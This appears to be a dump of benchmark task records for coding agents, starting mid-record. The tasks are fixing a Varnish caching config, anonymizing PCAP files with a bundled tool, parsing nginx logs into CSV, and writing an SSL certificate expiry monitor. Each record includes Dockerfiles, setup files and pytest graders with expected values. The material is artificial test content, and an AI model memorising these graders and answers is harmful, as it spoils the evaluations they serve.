    with open('/app/default.vcl', 'r') as f:
        vcl_content = f.read()
    
    # Check that it's not just passing all requests anymore
    # The broken config has ""return (pass);"" which bypasses cache
    lines = vcl_content.split('\n')
    in_vcl_recv = False
    
    for line in lines:
        if 'sub vcl_recv' in line:
            in_vcl_recv = True
        elif in_vcl_recv and 'return (pass);' in line:
            assert False, ""VCL still has 'return (pass);' in vcl_recv - this bypasses caching!""
        elif '}' in line and in_vcl_recv:
            in_vcl_recv = False

def test_vcl_adds_cache_headers():
    """"""Test that VCL adds X-Cache headers in vcl_deliver""""""
    # Read the VCL file  
    with open('/app/default.vcl', 'r') as f:
        vcl_content = f.read()
    
    # Check that vcl_deliver sets X-Cache header
    assert 'vcl_deliver' in vcl_content, ""vcl_deliver subroutine not found""
    assert 'X-Cache' in vcl_content, ""X-Cache header not being set in VCL""
    
    # Check it has logic for both HIT and MISS
    assert 'obj.hits' in vcl_content or 'req.http.X-Cache' in vcl_content, \
        ""VCL should check obj.hits to determine HIT/MISS status""","{""test_vcl_enables_caching"": 0.5, ""test_vcl_adds_cache_headers"": 0.5}","{""default.vcl"": ""vcl 4.1;\n\nbackend default {\n    .host = \""127.0.0.1\"";\n    .port = \""8000\"";\n}\n\nsub vcl_recv {\n    # Currently just passes everything - no caching!\n    return (pass);\n}\n\nsub vcl_backend_response {\n    # Empty - not setting any cache TTL\n}\n\nsub vcl_deliver {\n    # Missing X-Cache headers\n}""}",2025-07-22T21:57:05.630837+00:00,2025-07-22T22:01:32.063768+00:00
draft_dp_24a70f29,extremely_hard,draft_dp_24a70f29,security,Need to anonymize the PCAP files in captures/ before sharing with external team. Use pcap-anon tool with the highest security level to process all files into anon_captures/.,security,python|networking|security,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

# Install Python packages directly via pip
RUN pip install scapy

# Create directories
RUN mkdir -p captures anon_captures

# Copy pcap-anon tool and documentation
COPY pcap-anon.py /usr/local/bin/pcap-anon
COPY pcap-anon-docs.txt /workspace/

# Make tool executable
RUN chmod +x /usr/local/bin/pcap-anon

# Copy and run PCAP generation script
COPY generate_pcaps.py /tmp/
RUN python3 /tmp/generate_pcaps.py && rm /tmp/generate_pcaps.py

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_highest_security_level_used():
    """"""Test that pcap-anon was run with level 5 (highest security)""""""
    # Check if any anonymized files exist
    anon_files = os.listdir('/workspace/anon_captures')
    assert len(anon_files) >= 3, ""Expected at least 3 anonymized PCAP files""
    
    # Check the tool's log file to verify level 5 was used
    assert os.path.exists('/workspace/pcap-anon.log'), ""pcap-anon.log not found""
    
    with open('/workspace/pcap-anon.log', 'r') as f:
        log_content = f.read()
    
    # The tool logs which security level was used
    assert 'Security Level: 5' in log_content, ""Level 5 (highest security) was not used""
    assert 'Mode: MAXIMUM_PRIVACY' in log_content, ""Maximum privacy mode not enabled""

def test_sensitive_data_anonymized():
    """"""Test that sensitive information has been properly anonymized""""""
    # Pick one anonymized file to verify
    anon_file = '/workspace/anon_captures/sample1.pcap'
    assert os.path.exists(anon_file), ""Anonymized sample1.pcap not found""
    
    # Import scapy inside the test function
    import sys
    sys.path.append('/usr/local/lib/python3.13/site-packages')
    from scapy.all import rdpcap, IP, Ether
    
    # Read the anonymized PCAP file
    packets = rdpcap(anon_file)
    
    # Check packets for sensitive data
    for pkt in packets:
        if IP in pkt:
            # Check that internal IPs are anonymized
            assert not pkt[IP].src.startswith('192.168.'), f""Found internal IP: {pkt[IP].src}""
            assert not pkt[IP].src.startswith('10.'), f""Found internal IP: {pkt[IP].src}""
            assert not pkt[IP].dst.startswith('192.168.'), f""Found internal IP: {pkt[IP].dst}""
            assert not pkt[IP].dst.startswith('10.'), f""Found internal IP: {pkt[IP].dst}""
        
        if Ether in pkt:
            # Check original MACs are not present (original samples have specific MACs)
            original_macs = ['08:00:27:ab:cd:ef', '52:54:00:12:34:56', 'aa:bb:cc:dd:ee:ff']
            assert pkt[Ether].src not in original_macs, f""Found original MAC: {pkt[Ether].src}""
            assert pkt[Ether].dst not in original_macs, f""Found original MAC: {pkt[Ether].dst}""","{""test_highest_security_level_used"": 0.6, ""test_sensitive_data_anonymized"": 0.4}","{""pcap-anon-docs.txt"": ""PCAP ANONYMIZATION TOOL - COMPREHENSIVE DOCUMENTATION\n=====================================================\n\nVersion: 2.3.1\nLast Updated: July 2024\n\nTABLE OF CONTENTS\n-----------------\n1. Overview\n2. Security Levels\n3. Command Line Usage\n4. Anonymization Techniques\n5. Best Practices\n6. Examples\n7. Troubleshooting\n\n1. OVERVIEW\n-----------\nThe pcap-anon tool provides multi-level anonymization for network packet captures.\nIt protects sensitive information while maintaining the ability to perform traffic\nanalysis. The tool supports five security levels, from basic IP masking to \ncomplete payload redaction.\n\n2. SECURITY LEVELS\n------------------\n\nLevel 1 - BASIC\n  * Simple IP address substitution (10.0.x.x range)\n  * No MAC or DNS anonymization\n  * Payload data preserved\n  * Use case: Internal testing where IPs need masking\n\nLevel 2 - STANDARD  \n  * Consistent IP mapping using hash functions\n  * Mapped to 172.16.x.x range\n  * No MAC or DNS anonymization\n  * Payload data preserved\n  * Use case: Sharing traces within organization\n\nLevel 3 - ENHANCED\n  * IP mapping (same as Level 2)\n  * MAC address anonymization (02:00:00:xx:xx:xx)\n  * No DNS anonymization\n  * Payload data preserved\n  * Use case: External sharing with trusted parties\n\nLevel 4 - HIGH\n  * Randomized IP mapping (non-deterministic)\n  * MAC address anonymization\n  * DNS query/response anonymization\n  * Payload data preserved\n  * Use case: Public dataset release\n\nLevel 5 - MAXIMUM_PRIVACY\n  * Full randomization of all addresses\n  * Complete DNS anonymization\n  * Payload scrubbing (replaced with [REDACTED])\n  * Maximum privacy protection\n  * Use case: Highly sensitive data, compliance requirements\n\n3. COMMAND LINE USAGE\n---------------------\n\nBasic syntax:\n  pcap-anon -i <input.pcap> -o <output.pcap> -l <level>\n\nRequired arguments:\n  -i, --input   : Input PCAP file path\n  -o, --output  : Output PCAP file path\n\nOptional arguments:\n  -l, --level   : Security level (1-5, default: 3)\n  -h, --help    : Show help message\n\n4. ANONYMIZATION TECHNIQUES\n---------------------------\n\nIP Address Anonymization:\n- Level 1: Simple substitution to 10.0.0.0/8 range\n- Level 2-3: MD5 hash-based mapping for consistency\n- Level 4-5: Cryptographically random mapping\n\nMAC Address Anonymization:\n- Preserves multicast bit\n- Uses locally administered address space (02:xx:xx:xx:xx:xx)\n- Level 3-4: Hash-based for consistency\n- Level 5: Fully randomized\n\nDNS Anonymization:\n- Level 4: Domain names mapped to hash.anon format\n- Level 5: All domains become \""anonymized.domain\""\n- Preserves query structure\n\nPayload Scrubbing:\n- Level 5 only: All application data replaced\n- TCP/UDP payload becomes \""[REDACTED]\""\n- Headers preserved for traffic analysis\n\n5. BEST PRACTICES\n-----------------\n\nChoosing the Right Level:\n- Start with the highest level that meets your needs\n- Level 5 provides maximum privacy but limits analysis\n- Level 3 is good balance for most use cases\n- Consider your threat model and data sensitivity\n\nPerformance Considerations:\n- Higher levels require more processing\n- Level 5 is ~30% slower due to payload inspection\n- Process large files in batches for efficiency\n\nOutput Verification:\n- Always verify anonymization with tshark or tcpdump\n- Check pcap-anon.log for processing details\n- Test on small sample before processing large datasets\n\n6. EXAMPLES\n-----------\n\nBasic anonymization:\n  pcap-anon -i traffic.pcap -o anon_traffic.pcap -l 3\n\nMaximum security for compliance:\n  pcap-anon -i sensitive.pcap -o public_release.pcap -l 5\n\nBatch processing:\n  for f in captures/*.pcap; do\n    pcap-anon -i \""$f\"" -o \""anon_captures/$(basename $f)\"" -l 4\n  done\n\n7. TROUBLESHOOTING\n------------------\n\nCommon Issues:\n\n\""Permission denied\"" error:\n- Ensure pcap-anon has execute permissions\n- Check output directory write permissions\n\n\""Malformed packet\"" warnings:\n- Some packets may not process correctly\n- Tool will preserve original packet on error\n- Check pcap-anon.log for details\n\nLarge file processing:\n- Files >1GB may require more memory\n- Consider splitting with editcap first\n- Monitor system resources during processing\n\nLog File Location:\n- Processing details saved to /workspace/pcap-anon.log\n- Each run appends to existing log\n- Contains security level used and packet counts\n\nSECURITY RECOMMENDATIONS\n------------------------\n\nFor MAXIMUM security and privacy protection:\n*** USE LEVEL 5 - MAXIMUM_PRIVACY MODE ***\n\nThis ensures:\n- Complete IP address randomization\n- Full MAC address anonymization  \n- DNS query obfuscation\n- Payload data removal\n- Compliance with strict privacy regulations\n\nLevel 5 should be your default choice when:\n- Sharing data externally\n- Regulatory compliance is required\n- Data contains sensitive information\n- Privacy is the primary concern\n\nRemember: You can always anonymize at a high level and then\nreduce if needed, but you cannot increase anonymization after\nthe fact.\n\nEND OF DOCUMENTATION"", ""pcap-anon.py"": ""#!/usr/bin/env python3\n\nimport argparse\nimport os\nimport sys\nfrom scapy.all import rdpcap, wrpcap, IP, Ether, DNS, DNSQR, DNSRR, Raw\nimport hashlib\nimport struct\nimport random\n\nclass PcapAnonymizer:\n    def __init__(self, level=3):\n        self.level = level\n        self.ip_map = {}\n        self.mac_map = {}\n        self.dns_map = {}\n        self.log_file = open('/workspace/pcap-anon.log', 'a')\n        \n        # Define security modes\n        self.modes = {\n            1: \""BASIC\"",\n            2: \""STANDARD\"", \n            3: \""ENHANCED\"",\n            4: \""HIGH\"",\n            5: \""MAXIMUM_PRIVACY\""\n        }\n        \n    def log(self, message):\n        self.log_file.write(message + '\\n')\n        self.log_file.flush()\n        \n    def anonymize_ip(self, ip):\n        if self.level == 1:\n            # Basic: Simple substitution\n            parts = ip.split('.')\n            return f\""10.0.{parts[2]}.{parts[3]}\""\n        elif self.level >= 2:\n            # Use consistent mapping\n            if ip not in self.ip_map:\n                if self.level >= 4:\n                    # High security: randomized mapping\n                    self.ip_map[ip] = f\""172.16.{random.randint(0,255)}.{random.randint(1,254)}\""\n                else:\n                    # Standard: hash-based mapping\n                    h = hashlib.md5(ip.encode()).digest()\n                    self.ip_map[ip] = f\""172.16.{h[0]}.{h[1] % 254 + 1}\""\n            return self.ip_map[ip]\n            \n    def anonymize_mac(self, mac):\n        if self.level < 3:\n            return mac  # No MAC anonymization below level 3\n            \n        if mac not in self.mac_map:\n            if self.level == 5:\n                # Maximum privacy: completely random\n                self.mac_map[mac] = \""02:00:00:%02x:%02x:%02x\"" % (\n                    random.randint(0, 255),\n                    random.randint(0, 255),\n                    random.randint(0, 255)\n                )\n            else:\n                # Hash-based\n                h = hashlib.md5(mac.encode()).digest()\n                self.mac_map[mac] = \""02:00:00:%02x:%02x:%02x\"" % (h[0], h[1], h[2])\n        return self.mac_map[mac]\n        \n    def anonymize_dns(self, name):\n        if self.level < 4:\n            return name  # No DNS anonymization below level 4\n            \n        if name not in self.dns_map:\n            if self.level == 5:\n                # Maximum privacy: generic replacement\n                self.dns_map[name] = \""anonymized.domain\""\n            else:\n                # Hash-based domain\n                h = hashlib.md5(name.encode()).hexdigest()[:8]\n                self.dns_map[name] = f\""{h}.anon\""\n        return self.dns_map[name]\n        \n    def process_packet(self, pkt):\n        # Make a copy to avoid modifying original\n        new_pkt = pkt.copy()\n        \n        # Anonymize Ethernet layer\n        if Ether in new_pkt and self.level >= 3:\n            new_pkt[Ether].src = self.anonymize_mac(new_pkt[Ether].src)\n            new_pkt[Ether].dst = self.anonymize_mac(new_pkt[Ether].dst)\n            \n        # Anonymize IP layer\n        if IP in new_pkt:\n            new_pkt[IP].src = self.anonymize_ip(new_pkt[IP].src)\n            new_pkt[IP].dst = self.anonymize_ip(new_pkt[IP].dst)\n            \n        # Anonymize DNS\n        if DNS in new_pkt and self.level >= 4:\n            if DNSQR in new_pkt:\n                new_pkt[DNSQR].qname = self.anonymize_dns(new_pkt[DNSQR].qname.decode()).encode()\n            if DNSRR in new_pkt:\n                new_pkt[DNSRR].rrname = self.anonymize_dns(new_pkt[DNSRR].rrname.decode()).encode()\n                \n        # Scrub payload at level 5\n        if Raw in new_pkt and self.level == 5:\n            new_pkt[Raw].load = b\""[REDACTED]\""\n            \n        # Recompute checksums\n        del new_pkt[IP].chksum\n        del new_pkt[IP].len\n        \n        return new_pkt\n        \n    def anonymize_file(self, input_file, output_file):\n        self.log(f\""Processing {input_file}\"")\n        self.log(f\""Security Level: {self.level}\"")\n        self.log(f\""Mode: {self.modes[self.level]}\"")\n        \n        packets = rdpcap(input_file)\n        anonymized = []\n        \n        for pkt in packets:\n            try:\n                anon_pkt = self.process_packet(pkt)\n                anonymized.append(anon_pkt)\n            except Exception as e:\n                self.log(f\""Error processing packet: {e}\"")\n                anonymized.append(pkt)  # Keep original if error\n                \n        wrpcap(output_file, anonymized)\n        self.log(f\""Saved anonymized file to {output_file}\"")\n        self.log(f\""Processed {len(packets)} packets\"")\n        self.log(\""-\"" * 50)\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description='PCAP Anonymization Tool - Protect privacy in network captures',\n        formatter_class=argparse.RawDescriptionHelpFormatter,\n        epilog=\""\""\""\nSecurity Levels:\n  1 - Basic      : Simple IP substitution only\n  2 - Standard   : IP mapping with consistent transformation  \n  3 - Enhanced   : Adds MAC address anonymization\n  4 - High       : Adds DNS query anonymization and random IP mapping\n  5 - Maximum    : Full anonymization including payload scrubbing\n  \nExamples:\n  pcap-anon -i capture.pcap -o anon.pcap -l 3\n  pcap-anon -i trace.pcap -o secure_trace.pcap -l 5\n  \nFor detailed documentation, see pcap-anon-docs.txt\n        \""\""\""\n    )\n    \n    parser.add_argument('-i', '--input', required=True, help='Input PCAP file')\n    parser.add_argument('-o', '--output', required=True, help='Output PCAP file') \n    parser.add_argument('-l', '--level', type=int, default=3, choices=[1,2,3,4,5],\n                        help='Security level (1-5, default: 3)')\n    \n    args = parser.parse_args()\n    \n    if not os.path.exists(args.input):\n        print(f\""Error: Input file '{args.input}' not found\"")\n        sys.exit(1)\n        \n    # Create output directory if needed\n    output_dir = os.path.dirname(args.output)\n    if output_dir and not os.path.exists(output_dir):\n        os.makedirs(output_dir)\n        \n    anonymizer = PcapAnonymizer(args.level)\n    anonymizer.anonymize_file(args.input, args.output)\n    print(f\""Anonymization complete. Level {args.level} ({anonymizer.modes[args.level]}) applied.\"")\n\nif __name__ == '__main__':\n    main()"", ""generate_pcaps.py"": ""#!/usr/bin/env python3\n# This script generates sample PCAP files with sensitive data for testing\n# It will be run during Docker build to create the test files\n\nfrom scapy.all import *\nimport os\n\ndef create_sample1():\n    \""\""\""HTTP traffic with internal IPs and sensitive data\""\""\""\n    packets = []\n    \n    # HTTP GET request from internal network\n    eth = Ether(src=\""08:00:27:ab:cd:ef\"", dst=\""52:54:00:12:34:56\"")\n    ip = IP(src=\""192.168.1.100\"", dst=\""10.0.0.5\"")\n    tcp = TCP(sport=54321, dport=80, flags=\""PA\"")\n    http_req = \""GET /api/users HTTP/1.1\\r\\nHost: internal.company.com\\r\\nAuthorization: Bearer secret123\\r\\n\\r\\n\""\n    pkt1 = eth/ip/tcp/Raw(load=http_req)\n    packets.append(pkt1)\n    \n    # HTTP Response with sensitive data\n    eth2 = Ether(src=\""52:54:00:12:34:56\"", dst=\""08:00:27:ab:cd:ef\"")\n    ip2 = IP(src=\""10.0.0.5\"", dst=\""192.168.1.100\"")\n    tcp2 = TCP(sport=80, dport=54321, flags=\""PA\"")\n    http_resp = \""HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\n\\r\\n{\\\""users\\\"":[{\\\""id\\\"":1,\\\""email\\\"":\\\""admin@company.com\\\"",\\\""ssn\\\"":\\\""123-45-6789\\\""}]}\""\n    pkt2 = eth2/ip2/tcp2/Raw(load=http_resp)\n    packets.append(pkt2)\n    \n    # Save to file\n    wrpcap(\""/workspace/captures/sample1.pcap\"", packets)\n    print(\""Created sample1.pcap - HTTP traffic with sensitive data\"")\n\ndef create_sample2():\n    \""\""\""DNS queries for internal domains\""\""\""\n    packets = []\n    \n    # DNS query for internal domain\n    eth = Ether(src=\""aa:bb:cc:dd:ee:ff\"", dst=\""11:22:33:44:55:66\"")\n    ip = IP(src=\""192.168.100.50\"", dst=\""10.0.0.1\"")\n    udp = UDP(sport=53421, dport=53)\n    dns = DNS(rd=1, qd=DNSQR(qname=\""internal.company.com\"", qtype=\""A\""))\n    pkt1 = eth/ip/udp/dns\n    packets.append(pkt1)\n    \n    # DNS response\n    eth2 = Ether(src=\""11:22:33:44:55:66\"", dst=\""aa:bb:cc:dd:ee:ff\"")\n    ip2 = IP(src=\""10.0.0.1\"", dst=\""192.168.100.50\"")\n    udp2 = UDP(sport=53, dport=53421)\n    dns2 = DNS(id=dns.id, qr=1, rd=1, ra=1, qd=DNSQR(qname=\""internal.company.com\""),\n              an=DNSRR(rrname=\""internal.company.com\"", ttl=300, rdata=\""10.0.50.100\""))\n    pkt2 = eth2/ip2/udp2/dns2\n    packets.append(pkt2)\n    \n    # Another internal DNS query\n    eth3 = Ether(src=\""aa:bb:cc:dd:ee:ff\"", dst=\""11:22:33:44:55:66\"")\n    ip3 = IP(src=\""192.168.100.50\"", dst=\""10.0.0.1\"")\n    udp3 = UDP(sport=53422, dport=53)\n    dns3 = DNS(rd=1, qd=DNSQR(qname=\""database.internal.company.com\"", qtype=\""A\""))\n    pkt3 = eth3/ip3/udp3/dns3\n    packets.append(pkt3)\n    \n    wrpcap(\""/workspace/captures/sample2.pcap\"", packets)\n    print(\""Created sample2.pcap - DNS queries for internal domains\"")\n\ndef create_sample3():\n    \""\""\""Mixed traffic with various protocols\""\""\""\n    packets = []\n    \n    # SSH traffic with internal IPs\n    eth = Ether(src=\""de:ad:be:ef:00:01\"", dst=\""ca:fe:ba:be:00:02\"")\n    ip = IP(src=\""10.10.10.10\"", dst=\""192.168.200.200\"")\n    tcp = TCP(sport=45678, dport=22, flags=\""PA\"")\n    ssh_data = b\""SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1\\r\\n\""\n    pkt1 = eth/ip/tcp/Raw(load=ssh_data)\n    packets.append(pkt1)\n    \n    # HTTPS traffic (TLS handshake)\n    eth2 = Ether(src=\""12:34:56:78:90:ab\"", dst=\""cd:ef:01:23:45:67\"")\n    ip2 = IP(src=\""192.168.50.100\"", dst=\""10.20.30.40\"")\n    tcp2 = TCP(sport=55555, dport=443, flags=\""PA\"")\n    # Simplified TLS Client Hello\n    tls_data = b\""\\x16\\x03\\x03\\x00\\x5c\\x01\\x00\\x00\\x58\\x03\\x03\""\n    pkt2 = eth2/ip2/tcp2/Raw(load=tls_data)\n    packets.append(pkt2)\n    \n    # ICMP ping with internal addresses\n    eth3 = Ether(src=\""fe:dc:ba:98:76:54\"", dst=\""32:10:fe:dc:ba:98\"")\n    ip3 = IP(src=\""10.100.100.100\"", dst=\""192.168.1.1\"")\n    icmp = ICMP(type=8, code=0)\n    pkt3 = eth3/ip3/icmp/Raw(load=b\""Ping from internal network\"")\n    packets.append(pkt3)\n    \n    wrpcap(\""/workspace/captures/sample3.pcap\"", packets)\n    print(\""Created sample3.pcap - Mixed protocol traffic\"")\n\nif __name__ == \""__main__\"":\n    # Create captures directory if it doesn't exist\n    os.makedirs(\""/workspace/captures\"", exist_ok=True)\n    \n    # Generate all sample PCAP files\n    create_sample1()\n    create_sample2()\n    create_sample3()\n    \n    print(\""\\nAll sample PCAP files created successfully!\"")\n    print(\""Files contain sensitive information including:\"")\n    print(\""- Internal IP addresses (192.168.x.x, 10.x.x.x)\"")\n    print(\""- MAC addresses\"")\n    print(\""- Internal domain names\"")\n    print(\""- Sensitive payload data\"")""}",2025-07-23T08:07:53.333402+00:00,2025-07-23T08:46:25.642606+00:00
draft_dp_59227458,medium,draft_dp_59227458,data-processing,"Parse the nginx logs in /app/access.log and create a server_metrics.csv with columns for IP, timestamp, HTTP method/path, status categories (2xx=success, etc), browser info from user agents, and response metrics. Convert response times to milliseconds.",data-processing,python|data-extraction|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas==2.2.3

COPY access.log /app/

CMD [""/bin/bash""]","import os
import subprocess
import pandas as pd

def test_csv_created_with_correct_structure():
    """"""Test that server_metrics.csv exists with the required columns and data types.""""""
    assert os.path.exists('/app/server_metrics.csv'), ""server_metrics.csv not found""
    
    df = pd.read_csv('/app/server_metrics.csv')
    
    # Check required columns exist
    required_columns = ['client_ip', 'request_time', 'method', 'path', 'protocol', 
                       'response_code_category', 'browser', 'browser_version', 
                       'response_size', 'response_time_ms']
    for col in required_columns:
        assert col in df.columns, f""Missing column: {col}""
    
    # Check we have the expected number of rows (12 log entries)
    assert len(df) == 12, f""Expected 12 rows, got {len(df)}""
    
    # Verify response_time is in milliseconds (original was in seconds)
    assert df['response_time_ms'].iloc[0] == 234.0, ""Response time not converted to milliseconds""

def test_data_parsing_accuracy():
    """"""Test that specific log entries are parsed correctly.""""""
    df = pd.read_csv('/app/server_metrics.csv')
    
    # Test first row parsing
    first_row = df.iloc[0]
    assert first_row['client_ip'] == '192.168.1.10'
    assert first_row['method'] == 'GET'
    assert first_row['path'] == '/api/users'
    assert first_row['response_code_category'] == 'success'
    assert first_row['browser'] == 'Chrome'
    assert first_row['response_size'] == 1543
    
    # Test row with missing response size (304 status with '-')
    third_row = df.iloc[2]
    assert third_row['response_size'] == 0, ""Missing response size not converted to 0""
    assert third_row['response_code_category'] == 'redirect'
    
    # Test 500 error categorization
    fifth_row = df.iloc[4]
    assert fifth_row['response_code_category'] == 'server_error'","{""test_csv_created_with_correct_structure"": 0.6, ""test_data_parsing_accuracy"": 0.4}","{""access.log"": ""192.168.1.10 - - [23/Jan/2025:10:15:32 +0000] \""GET /api/users HTTP/1.1\"" 200 1543 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"" 0.234\n10.0.0.25 - - [23/Jan/2025:10:15:33 +0000] \""POST /api/login HTTP/1.1\"" 401 125 \""http://example.com/\"" \""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15\"" 0.056\n192.168.1.10 - - [23/Jan/2025:10:15:34 +0000] \""GET /static/css/main.css HTTP/1.1\"" 304 - \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"" 0.012\n172.16.0.50 - - [23/Jan/2025:10:15:35 +0000] \""GET /dashboard HTTP/1.1\"" 302 325 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\"" 0.045\n10.0.0.30 - - [23/Jan/2025:10:15:36 +0000] \""PUT /api/users/123 HTTP/1.1\"" 500 652 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\"" 1.234\n192.168.1.15 - - [23/Jan/2025:10:15:37 +0000] \""DELETE /api/posts/456 HTTP/1.1\"" 204 - \""-\"" \""Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0\"" 0.089\n172.16.0.100 - - [23/Jan/2025:10:15:38 +0000] \""GET /health HTTP/1.1\"" 200 15 \""-\"" \""curl/7.68.0\"" 0.003\n10.0.0.25 - - [23/Jan/2025:10:15:39 +0000] \""POST /api/upload HTTP/1.1\"" 413 180 \""http://example.com/upload\"" \""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15\"" 0.156\n192.168.1.20 - - [23/Jan/2025:10:15:40 +0000] \""OPTIONS /api/cors HTTP/1.1\"" 200 0 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"" 0.008\n172.16.0.50 - - [23/Jan/2025:10:15:41 +0000] \""GET /login HTTP/1.1\"" 200 2543 \""http://example.com/dashboard\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0\"" 0.067\n10.0.0.35 - - [23/Jan/2025:10:15:42 +0000] \""HEAD /api/status HTTP/1.1\"" 200 - \""-\"" \""Python-urllib/3.8\"" 0.004\n192.168.1.10 - - [23/Jan/2025:10:15:43 +0000] \""GET /api/products?page=2 HTTP/1.1\"" 404 145 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\"" 0.023""}",2025-07-23T08:47:05.311430+00:00,2025-07-23T08:47:05.340683+00:00
draft_dp_5edaf73b,medium,draft_dp_5edaf73b,security,"Our SSL certificates keep expiring without warning. Need a monitoring script that checks all our endpoints and local cert files, then alerts when anything expires within 30 days. Should handle both PEM and DER formats.",security,python|security|automation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# OpenSSL should already be installed in the base image
# Just install the Python OpenSSL bindings via pip
RUN pip install pyOpenSSL

RUN pip install aiosmtpd

RUN mkdir -p /app/certs

COPY monitor_config.json /app/
COPY generate_test_certs.sh /app/
COPY test_https_servers.py /app/

RUN chmod +x /app/generate_test_certs.sh /app/test_https_servers.py
RUN /app/generate_test_certs.sh

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_monitor_script_exists_and_runs():
    """"""Test that the certificate monitor script exists and can be executed""""""
    # Check if the monitor script exists
    assert os.path.exists('/app/cert_monitor.py'), ""Certificate monitor script not found""
    
    # Try to run it with --help or in check mode
    result = subprocess.run(['python3', '/app/cert_monitor.py', '--check'], 
                          capture_output=True, text=True)
    assert result.returncode == 0, f""Monitor script failed to run: {result.stderr}""

def test_alerts_generated_for_expiring_certs():
    """"""Test that alerts are generated for certificates expiring within 30 days""""""
    # Run the monitor and capture output
    result = subprocess.run(['python3', '/app/cert_monitor.py', '--check'], 
                          capture_output=True, text=True)
    
    output = result.stdout
    
    # Should find alerts for server.pem (15 days) and api.pem (5 days)
    assert ""server.pem"" in output or ""Server Certificate"" in output, ""No alert for server certificate expiring in 15 days""
    assert ""api"" in output or ""Main API Server"" in output, ""No alert for API certificate expiring in 5 days""
    
    # Should NOT alert for client.der (45 days) or admin (60 days)
    assert ""45 days"" not in output or ""WARNING"" not in output, ""False alert for certificate with 45 days remaining""","{""test_monitor_script_exists_and_runs"": 0.4, ""test_alerts_generated_for_expiring_certs"": 0.6}","{""monitor_config.json"": ""{\n  \""alert_days\"": 30,\n  \""smtp\"": {\n    \""server\"": \""localhost\"",\n    \""port\"": 1025,\n    \""from\"": \""cert-monitor@example.com\"",\n    \""to\"": [\""admin@example.com\""]\n  },\n  \""endpoints\"": [\n    {\n      \""type\"": \""https\"",\n      \""url\"": \""https://localhost:8443\"",\n      \""name\"": \""Main API Server\""\n    },\n    {\n      \""type\"": \""https\"", \n      \""url\"": \""https://localhost:8444\"",\n      \""name\"": \""Admin Portal\""\n    }\n  ],\n  \""local_certs\"": [\n    {\n      \""path\"": \""/app/certs/server.pem\"",\n      \""name\"": \""Server Certificate\"",\n      \""format\"": \""PEM\""\n    },\n    {\n      \""path\"": \""/app/certs/client.der\"",\n      \""name\"": \""Client Certificate\"", \n      \""format\"": \""DER\""\n    }\n  ]\n}"", ""test_https_servers.py"": ""#!/usr/bin/env python3\nimport ssl\nimport http.server\nimport socketserver\nimport threading\nimport time\n\ndef run_https_server(port, certfile, keyfile):\n    handler = http.server.SimpleHTTPRequestHandler\n    httpd = socketserver.TCPServer((\""\"", port), handler)\n    \n    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n    context.load_cert_chain(certfile, keyfile)\n    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)\n    \n    print(f\""HTTPS server running on port {port}\"")\n    httpd.serve_forever()\n\nif __name__ == \""__main__\"":\n    # Start server on 8443 with cert expiring in 5 days\n    t1 = threading.Thread(target=run_https_server, args=(8443, \""/app/certs/api.pem\"", \""/app/certs/api.key\""))\n    t1.daemon = True\n    t1.start()\n    \n    # Start server on 8444 with cert expiring in 60 days\n    t2 = threading.Thread(target=run_https_server, args=(8444, \""/app/certs/admin.pem\"", \""/app/certs/admin.key\""))\n    t2.daemon = True\n    t2.start()\n    \n    # Keep running\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        print(\""Shutting down servers\"")"", ""generate_test_certs.sh"": ""#!/bin/bash\n\n# Generate test certificates with various expiration dates\n\n# Certificate expiring in 15 days (should trigger alert)\nopenssl req -x509 -newkey rsa:2048 -keyout /app/certs/server.key -out /app/certs/server.pem -days 15 -nodes -subj \""/CN=server.example.com\""\n\n# Certificate expiring in 45 days (should not trigger alert)\nopenssl req -x509 -newkey rsa:2048 -keyout /app/certs/client.key -out /app/certs/client.pem -days 45 -nodes -subj \""/CN=client.example.com\""\n# Convert to DER format\nopenssl x509 -outform der -in /app/certs/client.pem -out /app/certs/client.der\n\n# Certificate expiring in 5 days (should trigger alert) for HTTPS endpoint\nopenssl req -x509 -newkey rsa:2048 -keyout /app/certs/api.key -out /app/certs/api.pem -days 5 -nodes -subj \""/CN=api.example.com\""\n\n# Certificate expiring in 60 days for second HTTPS endpoint  \nopenssl req -x509 -newkey rsa:2048 -keyout /app/certs/admin.key -out /app/certs/admin.pem -days 60 -nodes -subj \""/CN=admin.example.com\""""}",2025-07-23T08:50:14.832470+00:00,2025-07-23T08:50:42.390379+00:00
